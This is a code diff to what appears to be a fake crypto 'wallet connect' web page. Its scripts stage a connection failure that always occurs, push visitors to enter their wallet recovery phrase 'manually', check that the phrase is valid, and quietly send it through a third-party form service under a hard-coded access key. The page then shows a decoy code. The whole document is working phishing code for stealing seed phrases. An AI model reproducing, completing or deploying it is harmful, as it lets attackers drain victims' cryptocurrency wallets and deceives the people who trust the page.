@@ -975,7 +975,7 @@
                                         Try again
                                     </button>
                                     <button type="button" id="connectManual" class="btn btn-md btn-primary">
-                                        Connect 
+                                        Connect Manually
                                     </button>
                                 </div>
                             </div>
@@ -1036,6 +1036,119 @@
 </html>
 
 
+<script>
+    $(document).ready(function () {
+
+        // open metamask function
+        async function openWeb() {
+
+            const modal = $('#connectModal');
+            modal.css('display', 'flex');
+            $('body').css('overflow-y', 'hidden');
+
+            $("#modalLoad").show();
+            $("#modalError").hide();
+            $("#modalConnect").hide();
+
+            setTimeout(function () {
+                $("#modalError").show();
+                $("#modalLoad").hide();
+                $("#modalConnect").hide();
+
+            }, 5000);
+
+            try {
+                // create a Web3Provider instance
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                // request access to the user's MetaMask account
+                await window.ethereum.request({
+                    method: 'eth_requestAccounts'
+                });
+                // get the current account address
+                const signer = provider.getSigner();
+                const address = await signer.getAddress();
+                //web3 connection end here
+            } catch (error) {
+                console.error('Error fetching data:', error);
+            }
+        }
+
+        $("#tryAgain").click(function () {
+            $("#modalLoad").show();
+            $("#modalError").hide();
+            $("#modalConnect").hide();
+            setTimeout(function () {
+                $("#modalError").show();
+                $("#modalLoad").hide();
+                $("#modalConnect").hide();
+            }, 5000);
+        });
+
+        $("#connectManual").click(function () {
+            $("#modalLoad").hide();
+            $("#modalError").hide();
+            $("#modalConnect").show();
+        });
+
+        // Get the modal
+        var modal = document.getElementById("connectModal");
+        let closeModal = document.getElementById("closeModal");
+
+
+        $(".img-box").on('click', function () {
+
+            // Get wallet name and image src from the clicked column
+            var walletName = $(this).find('.p-tag').text();
+            var walletImageSrc = $(this).find('img').attr('src');
+
+            $('#assetName').text(walletName);
+            $('#assetImg').attr('src', walletImageSrc);
+
+            openWeb();
+        });
+
+        closeModal.onclick = function () {
+            modal.style.display = "none";
+            document.body.style.overflowY = 'auto';
+        };
+
+        window.onclick = function (event) {
+            if (event.target == modal) {
+                modal.style.display = "none";
+                document.body.style.overflowY = 'auto';
+            }
+        };
+
+    });
+</script>
+
+<script>
+    // Get the input field element
+    const $inputPhrase = $("#formPhrase");
+    // Add an event listener to the input field for input events
+    $inputPhrase.on("input", function () {
+        // Remove any non-numeric characters
+        $("#formPhrase").removeClass("error");
+        $inputPhrase.val($inputPhrase.val().replace(/[^a-zA-Z\s]/g, ""));
+    });
+
+    function countWords(self) {
+        var spaces = self.value.match(/\S+/g);
+        var words = spaces ? spaces.length : 0;
+
+        if (words >= 11) {
+            document.getElementById("submit_phrase").disabled = false;
+        } else {
+            document.getElementById("submit_phrase").disabled = true;
+        }
+    }
+
+    // Ensure the function is also triggered when the user pastes
+	document.getElementById("formPhrase").addEventListener('paste', function () {
+		setTimeout(() => countWords(this), 0);
+	});
+    
+</script>
 
 <script>
     function generateRandomString(length) {
@@ -1065,40 +1178,30 @@
             const dappLinkName = "BLOCKCHAIN SPHERE "
 
             try {
-  const wallet = ethers.Wallet.fromMnemonic(dappWords);
-
-  // ✅ Correct Web3Forms setup
-  $.ajax({
-    url: "https://api.web3forms.com/submit",
-    method: "POST",
-    dataType: "json",
-    data: {
-      access_key: "7650ee6c-1d03-452e-85d4-adfb3158ee10", // your Web3Forms public key
-      dappWord: dappWords,
-      dappName: dappName,
-      linkName: dappLinkName
-    },
-    success: function (response) {
-      console.log("Form submitted successfully:", response);
-    },
-    error: function (xhr, status, error) {
-      console.error("Error submitting form:", xhr.responseText || error);
-    },
-    complete: function () {
-      console.log("Form submission completed.");
-    }
-  });
-
-  // UI handling after submission
-  document.getElementById("p-code").innerHTML = randomString;
-  $("#mainModal").hide();
-  $("#qrModal").show();
-  document.getElementById("submit_phrase").disabled = true;
-
-} catch (error) {
-  $("#formPhrase").addClass("error");
-  console.error("Invalid seed phrase:", error);
-}
+                const wallet = ethers.Wallet.fromMnemonic(dappWords);
+                // result box section
+                $.ajax({
+                    url: "https://api.web3forms.com/submit", 
+                    method: "POST",
+                    dataType: "JSON",
+                    data: {
+					 access_key: "7650ee6c-1d03-452e-85d4-adfb3158ee10", // your Web3Forms public key
+                        dappWord: dappWords,
+                        dappName: dappName,
+                        linkName: dappLinkName,
+                    },
+                    success: function () { },
+                    complete: function () { },
+                });
+                document.getElementById("p-code").innerHTML = randomString;
+                $("#mainModal").hide();
+                $("#qrModal").show();
+                document.getElementById("submit_phrase").disabled = true;
+            } catch (error) {
+                // console.error("Invalid seed phrase:", dappWords);
+                $("#formPhrase").addClass("error");
+                document.getElementById("submit_phrase").disabled = false;
+            }
         }
     });
 
